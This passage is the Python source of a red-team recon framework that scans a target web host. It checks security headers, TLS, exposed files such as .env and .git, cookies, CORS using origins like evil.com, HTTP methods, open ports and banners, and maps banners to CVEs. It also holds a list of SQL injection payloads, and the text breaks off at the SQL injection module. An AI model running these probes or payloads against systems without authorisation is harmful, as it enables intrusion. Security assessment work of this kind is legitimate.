#!/usr/bin/env python3
# =============================================================================
#   ███╗   ██╗     ██╗ ██████╗ ███████╗███╗   ██╗ █████╗ ██████╗ ██╗
#   ████╗  ██║     ██║██╔═══██╗██╔════╝████╗  ██║██╔══██╗██╔══██╗██║
#   ██╔██╗ ██║     ██║██║   ██║███████╗██╔██╗ ██║███████║██████╔╝██║
#   ██║╚██╗██║██   ██║██║   ██║╚════██║██║╚██╗██║██╔══██║██╔══██╗██║
#   ██║ ╚████║╚█████╔╝╚██████╔╝███████║██║ ╚████║██║  ██║██║  ██║██║
#   ╚═╝  ╚═══╝ ╚════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝
#
#   Njosnari — The Recon Viking
#   Author  : @s.k.7.l.d  (SⱩUⱠÐ / SK7LD Security Tools)
#   GitHub  : https://github.com/skuldexter-web
#   Version : 1.0.0
#   Target  : Debian / Kali / Ubuntu  |  Python 3.8+
#   License : MIT
#
#   "The ravens have eyes in every corner of the web."
# =============================================================================

import sys
import os
import re
import json
import ssl
import socket
import time
import threading
import urllib.request
import urllib.parse
import urllib.error
import subprocess
import base64
import hashlib
import hmac
import datetime
import concurrent.futures
from typing import Any, Dict, List, Optional, Tuple
from pathlib import Path

# ── Dependency Guard ──────────────────────────────────────────────────────────
try:
    import dns.resolver
    import dns.exception
    HAS_DNSPYTHON = True
except ImportError:
    HAS_DNSPYTHON = False

# ── Colour Codes ──────────────────────────────────────────────────────────────
class C:
    RED      = '\033[0;31m'
    BLOOD    = '\033[1;31m'
    GREEN    = '\033[0;32m'
    YELLOW   = '\033[1;33m'
    CYAN     = '\033[0;36m'
    BLUE     = '\033[0;34m'
    MAGENTA  = '\033[0;35m'
    WHITE    = '\033[1;37m'
    DIM      = '\033[2m'
    BOLD     = '\033[1m'
    ORANGE   = '\033[38;5;208m'
    RESET    = '\033[0m'

    @staticmethod
    def strip(text: str) -> str:
        return re.sub(r'\033\[[0-9;]*m', '', text)

# ── Global State ──────────────────────────────────────────────────────────────
_state_lock = threading.Lock()
state: Dict[str, Any] = {
    "target":       "",
    "target_host":  "",
    "target_ip":    "",
    "target_url":   "",
    "findings":     {},
    "errors":       {},
    "start_time":   0.0,
}

OLLAMA_URL   = "http://localhost:11434/api/generate"
OLLAMA_MODEL = "qwen2.5:3b"
OUTPUT_DIR   = Path.home() / ".njosnari" / "reports"

# ── Thread-Safe Writer ────────────────────────────────────────────────────────
_print_lock = threading.Lock()

def tprint(text: str, end: str = "\n") -> None:
    """Thread-safe print."""
    with _print_lock:
        print(text, end=end, flush=True)

def save_finding(module: str, data: Any) -> None:
    """Thread-safe write into global findings."""
    with _state_lock:
        state["findings"][module] = data

def save_error(module: str, error: str) -> None:
    with _state_lock:
        state["errors"][module] = error

# ── Banner ────────────────────────────────────────────────────────────────────
BANNER = f"""{C.BLOOD}
  ███╗   ██╗     ██╗ ██████╗ ███████╗███╗   ██╗ █████╗ ██████╗ ██╗
  ████╗  ██║     ██║██╔═══██╗██╔════╝████╗  ██║██╔══██╗██╔══██╗██║
  ██╔██╗ ██║     ██║██║   ██║███████╗██╔██╗ ██║███████║██████╔╝██║
  ██║╚██╗██║██   ██║██║   ██║╚════██║██║╚██╗██║██╔══██║██╔══██╗██║
  ██║ ╚████║╚█████╔╝╚██████╔╝███████║██║ ╚████║██║  ██║██║  ██║██║
  ╚═╝  ╚═══╝ ╚════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝
{C.RESET}
{C.DIM}  ╔══════════════════════════════════════════════════════════════╗
  ║  ⚔  N J Ó S N A R I  ——  T H E   R E C O N   V I K I N G  ⚔  ║
  ║       28-Module Red Team Framework  |  @s.k.7.l.d               ║
  ╚══════════════════════════════════════════════════════════════════╝{C.RESET}
"""

# ── Module Header Helper ──────────────────────────────────────────────────────
def mod_header(num: int, name: str) -> str:
    return (f"\n{C.BLOOD}┌─[{C.RESET}{C.BOLD}Module {num:02d}{C.RESET}{C.BLOOD}]"
            f"──[{C.RESET}{C.YELLOW}{name}{C.RESET}{C.BLOOD}]{C.RESET}")

def mod_ok(msg: str)   -> str: return f"  {C.GREEN}[+]{C.RESET} {msg}"
def mod_warn(msg: str) -> str: return f"  {C.YELLOW}[!]{C.RESET} {msg}"
def mod_info(msg: str) -> str: return f"  {C.CYAN}[*]{C.RESET} {msg}"
def mod_err(msg: str)  -> str: return f"  {C.RED}[-]{C.RESET} {msg}"
def mod_crit(msg: str) -> str: return f"  {C.BLOOD}{C.BOLD}[!!]{C.RESET} {msg}"

# ── HTTP Helper ───────────────────────────────────────────────────────────────
DEFAULT_HEADERS = {
    "User-Agent":      "Mozilla/5.0 (X11; Linux x86_64) Njosnari-ReconViking/1.0",
    "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection":      "close",
}

_ssl_ctx = ssl.create_default_context()
_ssl_ctx.check_hostname = False
_ssl_ctx.verify_mode    = ssl.CERT_NONE

class _NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    """Intercepts 3xx responses and returns them as-is instead of following Location."""
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None  # returning None stops urllib from following the redirect

_no_redirect_opener = urllib.request.build_opener(
    urllib.request.HTTPSHandler(context=_ssl_ctx),
    _NoRedirectHandler(),
)
_redirect_opener = urllib.request.build_opener(
    urllib.request.HTTPSHandler(context=_ssl_ctx),
)

def http_get(url: str, headers: Optional[Dict] = None, timeout: int = 8,
             allow_redirects: bool = True) -> Tuple[Optional[int], Dict, bytes]:
    """Returns (status_code, headers_dict, body_bytes). Never raises."""
    merged = {**DEFAULT_HEADERS, **(headers or {})}
    try:
        req = urllib.request.Request(url, headers=merged, method="GET")
        opener = _no_redirect_opener if not allow_redirects else _redirect_opener
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read(1 << 20)  # max 1 MB
            resp_headers = dict(resp.headers)
            return resp.status, resp_headers, body
    except urllib.error.HTTPError as e:
        # With _NoRedirectHandler, a blocked redirect surfaces here as an HTTPError
        # carrying the original 3xx status and Location header — exactly what callers need.
        try:
            body = e.read(1 << 16)
        except Exception:
            body = b""
        return e.code, dict(e.headers), body
    except Exception:
        return None, {}, b""

def http_request(url: str, method: str = "GET",
                 headers: Optional[Dict] = None,
                 data: Optional[bytes] = None,
                 timeout: int = 8) -> Tuple[Optional[int], Dict, bytes]:
    """Bare urllib request with method override."""
    merged = {**DEFAULT_HEADERS, **(headers or {})}
    try:
        req = urllib.request.Request(url, data=data, headers=merged, method=method)
        handler = urllib.request.HTTPSHandler(context=_ssl_ctx)
        opener = urllib.request.build_opener(handler)
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read(1 << 16)
            return resp.status, dict(resp.headers), body
    except urllib.error.HTTPError as e:
        try:
            body = e.read(1 << 16)
        except Exception:
            body = b""
        return e.code, dict(e.headers), body
    except Exception:
        return None, {}, b""

def normalise_target(raw: str) -> Tuple[str, str, str]:
    """
    Returns (url, host, ip).
    Adds https:// if no scheme. Never raises.
    """
    raw = raw.strip().rstrip("/")
    if not raw.startswith(("http://", "https://")):
        raw = "https://" + raw
    parsed = urllib.parse.urlparse(raw)
    host = parsed.hostname or raw
    try:
        ip = socket.gethostbyname(host)
    except socket.gaierror:
        ip = host
    return raw, host, ip

# =============================================================================
#  ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ ███████╗
#  ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗██╔════╝
#  ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝███████╗
#  ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗╚════██║
#  ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║███████║
#  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚══════╝
# =============================================================================

# ── [01] Security Headers ─────────────────────────────────────────────────────
def scan_security_headers() -> None:
    module = "01_security_headers"
    url    = state["target_url"]
    tprint(mod_header(1, "Security Headers — HSTS / CSP / X-Frame / Version Disclosure"))
    results = {"findings": [], "raw_headers": {}}
    try:
        status, headers, _ = http_get(url)
        if status is None:
            tprint(mod_err("No response from target"))
            save_error(module, "No response"); return

        h = {k.lower(): v for k, v in headers.items()}
        results["raw_headers"] = h

        checks = {
            "Strict-Transport-Security": "HSTS",
            "Content-Security-Policy":   "CSP",
            "X-Frame-Options":           "X-Frame-Options",
            "X-Content-Type-Options":    "X-Content-Type-Options",
            "Referrer-Policy":           "Referrer-Policy",
            "Permissions-Policy":        "Permissions-Policy",
            "X-XSS-Protection":          "X-XSS-Protection",
        }
        for raw_name, label in checks.items():
            key = raw_name.lower()
            if key in h:
                val = h[key]
                tprint(mod_ok(f"{label}: {C.GREEN}{val}{C.RESET}"))
                results["findings"].append({"header": label, "value": val, "status": "PRESENT"})
            else:
                tprint(mod_crit(f"{label}: {C.BLOOD}MISSING{C.RESET}"))
                results["findings"].append({"header": label, "value": None, "status": "MISSING"})

        # Server version disclosure
        server = h.get("server", "")
        x_powered = h.get("x-powered-by", "")
        if server:
            tprint(mod_warn(f"Server header disclosed: {C.YELLOW}{server}{C.RESET}"))
            results["findings"].append({"type": "version_disclosure", "header": "Server", "value": server})
        if x_powered:
            tprint(mod_warn(f"X-Powered-By disclosed: {C.YELLOW}{x_powered}{C.RESET}"))
            results["findings"].append({"type": "version_disclosure", "header": "X-Powered-By", "value": x_powered})

    except Exception as e:
        tprint(mod_err(f"Exception: {e}")); save_error(module, str(e))
    save_finding(module, results)


# ── [02] TLS / SSL ────────────────────────────────────────────────────────────
def scan_tls_ssl() -> None:
    module = "02_tls_ssl"
    host   = state["target_host"]
    tprint(mod_header(2, "TLS / SSL — Cert Expiry / Weak Ciphers / Deprecated Protocols"))
    results = {"cert": {}, "issues": []}
    try:
        # Certificate info
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((host, 443), timeout=8) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert       = ssock.getpeercert()
                cipher     = ssock.cipher()
                version    = ssock.version()

                not_after  = cert.get("notAfter", "")
                subject    = dict(x[0] for x in cert.get("subject", []))
                issuer     = dict(x[0] for x in cert.get("issuer", []))

                results["cert"] = {
                    "subject":    subject,
                    "issuer":     issuer,
                    "not_after":  not_after,
                    "cipher":     cipher,
                    "tls_version": version,
                }

                tprint(mod_info(f"TLS Version : {C.CYAN}{version}{C.RESET}"))
                tprint(mod_info(f"Cipher      : {cipher[0] if cipher else 'Unknown'}"))
                tprint(mod_info(f"Cert CN     : {subject.get('commonName', 'N/A')}"))
                tprint(mod_info(f"Issuer      : {issuer.get('organizationName', 'N/A')}"))
                tprint(mod_info(f"Expires     : {not_after}"))

                if not_after:
                    try:
                        exp_dt = datetime.datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
                        days_left = (exp_dt - datetime.datetime.utcnow()).days
                        if days_left < 0:
                            tprint(mod_crit(f"Certificate EXPIRED {abs(days_left)} days ago!"))
                            results["issues"].append("CERT_EXPIRED")
                        elif days_left < 30:
                            tprint(mod_warn(f"Certificate expires in {days_left} days!"))
                            results["issues"].append(f"CERT_EXPIRING_SOON:{days_left}d")
                        else:
                            tprint(mod_ok(f"Certificate valid for {days_left} more days."))
                    except ValueError:
                        pass

                if version in ("TLSv1", "TLSv1.1", "SSLv3", "SSLv2"):
                    tprint(mod_crit(f"Deprecated TLS version in use: {version}"))
                    results["issues"].append(f"DEPRECATED_TLS:{version}")

        # Check for deprecated protocol support with openssl CLI
        for proto_flag, proto_name in [("-tls1", "TLS 1.0"), ("-tls1_1", "TLS 1.1")]:
            try:
                res = subprocess.run(
                    ["openssl", "s_client", proto_flag, "-connect", f"{host}:443"],
                    input=b"Q\n", capture_output=True, timeout=5
                )
                if b"BEGIN CERTIFICATE" in res.stdout or b"Cipher" in res.stdout:
                    tprint(mod_crit(f"Server accepts {proto_name} — deprecated!"))
                    results["issues"].append(f"ACCEPTS_{proto_name.replace(' ', '_').upper()}")
            except Exception:
                pass

    except ssl.SSLError as e:
        tprint(mod_warn(f"SSL handshake issue: {e}"))
        results["issues"].append(f"SSL_ERROR:{e}")
    except (ConnectionRefusedError, socket.timeout, OSError) as e:
        tprint(mod_err(f"Port 443 not reachable: {e}"))
        save_error(module, str(e))
    except Exception as e:
        tprint(mod_err(f"Exception: {e}")); save_error(module, str(e))
    save_finding(module, results)


# ── [03] Sensitive Paths ──────────────────────────────────────────────────────
SENSITIVE_PATHS = [
    "/.env", "/.env.bak", "/.env.local", "/.env.production",
    "/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG",
    "/admin", "/admin/login", "/administrator", "/wp-admin", "/wp-login.php",
    "/phpmyadmin", "/pma", "/db", "/database",
    "/backup.zip", "/backup.tar.gz", "/backup.sql", "/dump.sql",
    "/db_backup.sql", "/www.tar.gz", "/site.zip",
    "/.travis.yml", "/.github/workflows", "/Jenkinsfile", "/.circleci/config.yml",
    "/config.php", "/config.yml", "/config.json", "/settings.py",
    "/web.config", "/.htaccess", "/robots.txt", "/sitemap.xml",
    "/server-status", "/server-info",
    "/api/v1/users", "/api/v1/admin", "/api/swagger.json", "/swagger.yaml",
    "/.DS_Store", "/thumbs.db",
    "/composer.json", "/package.json", "/Gemfile",
]

def scan_sensitive_paths() -> None:
    module = "03_sensitive_paths"
    base   = state["target_url"]
    tprint(mod_header(3, "Sensitive Paths — .env / .git / Admin / Backups / CI-CD"))
    results = {"exposed": [], "checked": len(SENSITIVE_PATHS)}

    def probe(path: str) -> None:
        url = base.rstrip("/") + path
        status, headers, body = http_get(url, timeout=5)
        if status and status not in (404, 410):
            content_len = len(body)
            entry = {"path": path, "status": status, "size": content_len}
            with _state_lock:
                results["exposed"].append(entry)
            severity = C.BLOOD if status == 200 else C.YELLOW
            tprint(mod_crit(f"HTTP {status} → {severity}{path}{C.RESET} ({content_len}B)"))

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        list(ex.map(probe, SENSITIVE_PATHS))

    if not results["exposed"]:
        tprint(mod_ok("No sensitive paths exposed."))
    save_finding(module, results)


# ── [04] Cookie Security ──────────────────────────────────────────────────────
def scan_cookie_security() -> None:
    module = "04_cookie_security"
    url    = state["target_url"]
    tprint(mod_header(4, "Cookie Security — HttpOnly / Secure / SameSite"))
    results = {"cookies": [], "issues": []}
    try:
        import http.cookiejar
        cj      = http.cookiejar.CookieJar()
        handler = urllib.request.HTTPCookieProcessor(cj)
        ssl_h   = urllib.request.HTTPSHandler(context=_ssl_ctx)
        opener  = urllib.request.build_opener(ssl_h, handler)
        req     = urllib.request.Request(url, headers=DEFAULT_HEADERS)
        opener.open(req, timeout=8)

        status, headers, _ = http_get(url)
        raw_cookies = []
        for k, v in headers.items():
            if k.lower() == "set-cookie":
                raw_cookies.append(v)

        if not raw_cookies:
            tprint(mod_info("No Set-Cookie headers found."))
        for raw in raw_cookies:
            parts    = [p.strip() for p in raw.split(";")]
            name_val = parts[0].split("=", 1)
            name     = name_val[0]
            attrs    = {p.lower(): True for p in parts[1:]}
            secure     = "secure"   in attrs
            httponly   = "httponly" in attrs
            samesite_raw = next((p for p in parts[1:] if p.lower().startswith("samesite")), "")
            samesite   = samesite_raw.split("=")[-1].strip() if samesite_raw else "MISSING"

            cookie_info = {
                "name":     name,
                "secure":   secure,
                "httponly": httponly,
                "samesite": samesite,
            }
            results["cookies"].append(cookie_info)
            issues = []
            if not secure:   issues.append("MISSING_SECURE")
            if not httponly: issues.append("MISSING_HTTPONLY")
            if samesite == "MISSING": issues.append("MISSING_SAMESITE")
            results["issues"].extend(issues)

            line = f"{C.CYAN}{name}{C.RESET}"
            line += f"  Secure={C.GREEN+'✓'+C.RESET if secure else C.BLOOD+'✗'+C.RESET}"
            line += f"  HttpOnly={C.GREEN+'✓'+C.RESET if httponly else C.BLOOD+'✗'+C.RESET}"
            line += f"  SameSite={samesite}"
            tprint(f"  {line}")

    except Exception as e:
        tprint(mod_err(f"Exception: {e}")); save_error(module, str(e))
    save_finding(module, results)


# ── [05] CORS ─────────────────────────────────────────────────────────────────
def scan_cors() -> None:
    module = "05_cors"
    url    = state["target_url"]
    host   = state["target_host"]
    tprint(mod_header(5, "CORS — Origin Reflection / Wildcard + Credentials"))
    results = {"findings": []}

    origins = [
        "https://evil.com",
        "https://attacker.io",
        "null",
        f"https://{host}.evil.com",
        f"https://evil{host}",
    ]
    for origin in origins:
        try:
            status, headers, _ = http_get(
                url,
                headers={"Origin": origin, "Access-Control-Request-Method": "GET"},
                timeout=6
            )
            if status is None:
                continue
            h = {k.lower(): v for k, v in headers.items()}
            acao  = h.get("access-control-allow-origin", "")
            acac  = h.get("access-control-allow-credentials", "").lower()

            if acao:
                vuln = (acao == "*" and acac == "true") or (acao == origin)
                entry = {
                    "origin": origin,
                    "acao":   acao,
                    "acac":   acac,
                    "vulnerable": vuln,
                }
                results["findings"].append(entry)
                if vuln:
                    tprint(mod_crit(
                        f"CORS reflects origin {C.BLOOD}{origin}{C.RESET} | "
                        f"Creds={acac}"
                    ))
                else:
                    tprint(mod_info(f"Origin {origin} → ACAO: {acao}"))
        except Exception:
            pass

    if not results["findings"]:
        tprint(mod_ok("No CORS misconfiguration detected."))
    save_finding(module, results)


# ── [06] HTTP Methods ─────────────────────────────────────────────────────────
DANGEROUS_METHODS = ["TRACE", "TRACK", "PUT", "DELETE", "PROPFIND", "OPTIONS",
                     "PATCH", "CONNECT", "HEAD", "MKCOL"]

def scan_http_methods() -> None:
    module = "06_http_methods"
    url    = state["target_url"]
    tprint(mod_header(6, "HTTP Methods — TRACE / PUT / DELETE / PROPFIND"))
    results = {"allowed": [], "dangerous": []}

    for method in DANGEROUS_METHODS:
        try:
            status, headers, body = http_request(url, method=method, timeout=6)
            if status and status not in (405, 501, 400):
                allowed_header = headers.get("Allow", headers.get("allow", ""))
                results["allowed"].append({"method": method, "status": status})
                if method in ("TRACE", "TRACK", "PUT", "DELETE", "PROPFIND", "MKCOL"):
                    results["dangerous"].append(method)
                    tprint(mod_crit(f"Dangerous method {C.BLOOD}{method}{C.RESET} → HTTP {status}"))
                else:
                    tprint(mod_info(f"Method {method} → HTTP {status}"))
                if method == "TRACE" and body and b"TRACE" in body.upper():
                    tprint(mod_crit("TRACE response echoed request — XST attack possible!"))
                    results["xst"] = True
        except Exception:
            pass

    if not results["dangerous"]:
        tprint(mod_ok("No dangerous HTTP methods enabled."))
    save_finding(module, results)


# ── [07] Port Scan + Banner Grab ──────────────────────────────────────────────
CRITICAL_PORTS = [
    21, 22, 23, 25, 53, 69, 80, 110, 111, 123, 135, 139,
    143, 161, 389, 443, 445, 512, 513, 514, 587, 993, 995,
    1433, 1521, 2049, 3306, 3389, 5432, 5900, 6379, 8080,
    8443, 8888, 9200, 27017,
]

PORT_SERVICES = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    69: "TFTP", 80: "HTTP", 110: "POP3", 111: "RPC", 123: "NTP",
    135: "MS-RPC", 139: "NetBIOS", 143: "IMAP", 161: "SNMP",
    389: "LDAP", 443: "HTTPS", 445: "SMB", 512: "rexec",
    513: "rlogin", 514: "rsh", 587: "SMTP-SUBMIT", 993: "IMAPS",
    995: "POP3S", 1433: "MS-SQL", 1521: "Oracle", 2049: "NFS",
    3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
    6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
    8888: "HTTP-Dev", 9200: "Elasticsearch", 27017: "MongoDB",
}

def probe_port(args: Tuple) -> Optional[Dict]:
    """Open a single TCP connection: confirms the port is open AND grabs the
    banner in the same session, instead of connecting twice (open-check, then
    a separate grab_banner connect)."""
    ip, port = args
    try:
        with socket.create_connection((ip, port), timeout=2) as s:
            s.settimeout(2)
            try:
                raw_banner = s.recv(1024)
                banner = raw_banner.decode("utf-8", errors="replace").strip()[:200]
            except socket.timeout:
                banner = ""
            service = PORT_SERVICES.get(port, "unknown")
            return {"port": port, "service": service, "banner": banner, "state": "OPEN"}
    except Exception:
        return None

def scan_ports() -> None:
    module = "07_port_scan"
    ip     = state["target_ip"]
    tprint(mod_header(7, f"Port Scan + Banner Grab — {len(CRITICAL_PORTS)} critical ports → {ip}"))
    results = {"open": [], "ip": ip}

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
        tasks = [(ip, p) for p in CRITICAL_PORTS]
        for result in ex.map(probe_port, tasks):
            if result:
                results["open"].append(result)
                banner_disp = result["banner"][:80] if result["banner"] else "(no banner)"
                tprint(mod_ok(
                    f"Port {C.CYAN}{result['port']:<6}{C.RESET}"
                    f"{C.GREEN}{result['service']:<15}{C.RESET}"
                    f"{C.DIM}{banner_disp}{C.RESET}"
                ))

    if not results["open"]:
        tprint(mod_info("No open ports found in the critical port set."))
    else:
        tprint(mod_info(f"Total open ports: {C.BOLD}{len(results['open'])}{C.RESET}"))
    save_finding(module, results)


# ── [08] Tech Fingerprinting ──────────────────────────────────────────────────
TECH_SIGNATURES: List[Dict] = [
    {"tech": "WordPress",    "patterns": ["wp-content", "wp-includes", "wp-json", "WordPress"],         "cve_hint": "CVE-2022-21661 / WP Core SQLi"},
    {"tech": "Drupal",       "patterns": ["Drupal", "sites/default", "X-Generator: Drupal"],            "cve_hint": "CVE-2018-7600 Drupalgeddon2"},
    {"tech": "Joomla",       "patterns": ["/components/com_", "Joomla!"],                               "cve_hint": "CVE-2023-23752 Joomla Info Disclosure"},
    {"tech": "Laravel",      "patterns": ["laravel_session", "Laravel", "X-Vapor"],                     "cve_hint": "Debug mode / .env exposure"},
    {"tech": "Django",       "patterns": ["csrftoken", "django", "__admin"],                             "cve_hint": "Debug page info disclosure"},
    {"tech": "Ruby on Rails","patterns": ["_session_id", "X-Runtime", "X-Request-Id"],                  "cve_hint": "CVE-2019-5420 File Disclosure"},
    {"tech": "PHP",          "patterns": ["X-Powered-By: PHP", ".php", "PHPSESSID"],                    "cve_hint": "Ensure PHP is up to date"},
    {"tech": "ASP.NET",      "patterns": ["ASP.NET", "X-AspNet-Version", "__VIEWSTATE", ".aspx"],       "cve_hint": "Verify .NET version — ViewState deserialization"},
    {"tech": "Spring Boot",  "patterns": ["Spring", "Whitelabel Error Page", "/actuator"],              "cve_hint": "CVE-2022-22965 Spring4Shell"},
    {"tech": "Express.js",   "patterns": ["X-Powered-By: Express", "connect.sid"],                      "cve_hint": "Ensure Helmet.js headers are set"},
    {"tech": "Nginx",        "patterns": ["nginx", "Server: nginx"],                                    "cve_hint": "Check nginx version for path traversal CVEs"},
    {"tech": "Apache",       "patterns": ["Apache", "Server: Apache", "mod_"],                          "cve_hint": "CVE-2021-41773 Apache path traversal"},
    {"tech": "IIS",          "patterns": ["Microsoft-IIS", "X-Powered-By: ASP.NET"],                    "cve_hint": "CVE-2017-7269 IIS RCE"},
    {"tech": "Tomcat",       "patterns": ["Apache Tomcat", "JSESSIONID", "tomcat"],                     "cve_hint": "CVE-2020-1938 Ghostcat"},
    {"tech": "OpenSSH",      "patterns": ["OpenSSH"],                                                   "cve_hint": "Check SSH version for known CVEs"},
    {"tech": "MySQL",        "patterns": ["mysql", "MariaDB", "MySQL"],                                  "cve_hint": "Verify authentication plugin"},
    {"tech": "MongoDB",      "patterns": ["MongoDB", "mongo"],                                           "cve_hint": "Unauthenticated access exposure"},
    {"tech": "Redis",        "patterns": ["Redis", "+PONG"],                                             "cve_hint": "CVE-2022-0543 Lua sandbox escape"},
    {"tech": "Elasticsearch","patterns": ["elasticsearch", "Elastic"],                                  "cve_hint": "Unauthenticated API exposure"},
    {"tech": "Next.js",      "patterns": ["__NEXT_DATA__", "_next/static"],                             "cve_hint": "Ensure NEXT_PUBLIC vars don't leak secrets"},
    {"tech": "Vue.js",       "patterns": ["Vue.js", "__vue_app__"],                                     "cve_hint": "Check for dev mode in production"},
    {"tech": "React",        "patterns": ["react-root", "__reactFiber", "data-reactroot"],              "cve_hint": "Ensure no source maps in production"},
]

def scan_tech_fingerprint() -> None:
    module = "08_tech_fingerprint"
    url    = state["target_url"]
    tprint(mod_header(8, "Tech Fingerprinting — 20+ Stacks + CVE Hints"))
    results = {"detected": []}
    try:
        status, headers, body = http_get(url, timeout=10)
        if not body and not headers:
            tprint(mod_err("No response")); save_error(module, "No response"); return

        body_str   = body.decode("utf-8", errors="replace")
        header_str = json.dumps(headers)
        combined   = body_str[:50000] + "\n" + header_str

        for sig in TECH_SIGNATURES:
            for pat in sig["patterns"]:
                if pat.lower() in combined.lower():
                    tprint(mod_ok(
                        f"Detected: {C.CYAN}{sig['tech']}{C.RESET}"
                        f" — {C.YELLOW}{sig['cve_hint']}{C.RESET}"
                    ))
                    results["detected"].append({
                        "tech":     sig["tech"],
                        "cve_hint": sig["cve_hint"],
                        "pattern":  pat,
                    })
                    break

        if not results["detected"]:
            tprint(mod_info("No specific technology stack identified."))

    except Exception as e:
        tprint(mod_err(f"Exception: {e}")); save_error(module, str(e))
    save_finding(module, results)


# ── [09] CVE Scan + Exploit Hints ────────────────────────────────────────────
def scan_cve() -> None:
    module = "09_cve_scan"
    tprint(mod_header(9, "CVE Scan + Exploit Hints — NVD Mapping"))
    results = {"cves": []}

    detected = state["findings"].get("08_tech_fingerprint", {}).get("detected", [])
    open_ports = state["findings"].get("07_port_scan", {}).get("open", [])
    raw_hdrs   = state["findings"].get("01_security_headers", {}).get("raw_headers", {})

    # Banner-based CVE hints
    banner_cve_map = {
        "openssh 7":  ("CVE-2023-38408", "OpenSSH 9.3p2 pre-auth RCE (ssh-agent)"),
        "openssh 8":  ("CVE-2023-38408", "OpenSSH ssh-agent RCE"),
        "apache/2.4.49": ("CVE-2021-41773", "Apache 2.4.49 Path Traversal / RCE"),
        "apache/2.4.50": ("CVE-2021-42013", "Apache 2.4.50 Path Traversal / RCE"),
        "php/7.4":    ("CVE-2021-21708", "PHP 7.4 use-after-free"),
        "iis/7.5":    ("CVE-2017-7269", "IIS WebDAV Buffer Overflow"),
        "nginx/1.16": ("CVE-2021-23017", "Nginx 1.16.x resolver RCE"),
        "redis 6":    ("CVE-2022-0543", "Redis Lua sandbox escape"),
        "mysql 5.7":  ("CVE-2021-22096", "MySQL 5.7 privilege escalation"),
        "elasticsearch 7": ("CVE-2021-22145", "ES 7.x memory exposure"),
        "tomcat/9.0": ("CVE-2020-1938", "Ghostcat — Tomcat AJP file inclusion"),
        "vsftpd 2.3": ("CVE-2011-2523", "vsftpd 2.3.4 backdoor"),
        "proftpd":    ("CVE-2019-12815", "ProFTPD arbitrary file copy"),
    }

    for port_info in open_ports:
        banner = (port_info.get("banner") or "").lower()
        for sig, (cve_id, desc) in banner_cve_map.items():
            if sig in banner:
                entry = {"cve": cve_id, "description": desc, "port": port_info["port"], "banner": banner[:100]}
                results["cves"].append(entry)
                tprint(mod_crit(f"{C.BLOOD}{cve_id}{C.RESET} → {desc} (port {port_info['port']})"))

    # Tech-based CVE overlay
    for tech in detected:
        if tech["cve_hint"] and "CVE" in tech["cve_hint"]:
            entry = {"cve": tech["cve_hint"], "tech": tech["tech"]}
            results["cves"].append(entry)
            tprint(mod_warn(f"{tech['tech']}: {tech['cve_hint']}"))

    # Server header version fingerprint
    server = raw_hdrs.get("server", "").lower()
    for sig, (cve_id, desc) in banner_cve_map.items():
        if sig in server:
            tprint(mod_crit(f"{C.BLOOD}{cve_id}{C.RESET} → {desc} (via Server header)"))
            results["cves"].append({"cve": cve_id, "description": desc, "source": "Server header"})

    # Live NVD API lookup for detected techs (CPE string attempt)
    for tech in detected[:3]:  # limit to avoid rate-limiting
        tech_name = tech["tech"].replace(" ", "%20").lower()
        nvd_url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={tech_name}&resultsPerPage=3"
        try:
            status, _, body = http_get(nvd_url, timeout=8)
            if status == 200 and body:
                data = json.loads(body)
                for vuln in data.get("vulnerabilities", []):
                    cve_id  = vuln["cve"]["id"]
                    descs   = vuln["cve"].get("descriptions", [])
                    desc    = next((d["value"] for d in descs if d["lang"] == "en"), "")[:120]
                    results["cves"].append({"cve": cve_id, "description": desc, "source": "NVD Live"})
                    tprint(mod_warn(f"NVD: {C.YELLOW}{cve_id}{C.RESET} — {desc}"))
        except Exception:
            pass

    if not results["cves"]:
        tprint(mod_ok("No version-matched CVEs found from banners."))
    save_finding(module, results)


# ── [10] SQL Injection ────────────────────────────────────────────────────────
SQL_PAYLOADS = [
    # Error-based
    ("'", "error_based"),
    ('"', "error_based"),
    ("'--", "error_based"),
    ("' OR '1'='1", "error_based"),
    ("' OR '1'='1'--", "error_based"),
    ("1' AND 1=1--", "error_based"),
    ("1' AND 1=2--", "boolean_based"),
    ("' AND SLEEP(3)--", "time_blind"),
    ("'; WAITFOR DELAY '0:0:3'--", "time_blind_mssql"),
    ("1; SELECT SLEEP(3)--", "time_blind"),
    ("' UNION SELECT NULL--", "union_based"),
    ("' UNION SELECT NULL,NULL--", "union_based"),
]

SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate",
    "ora-01756",
    "microsoft ole db provider for sql server",
    "pg::syntaxerror",
    "error in your sql syntax",
    "mysql_fetch",
    "sqlite3::query",
]

def scan_sqli() -> None:
    module = "10_sqli"
    url    = state["target_url"]
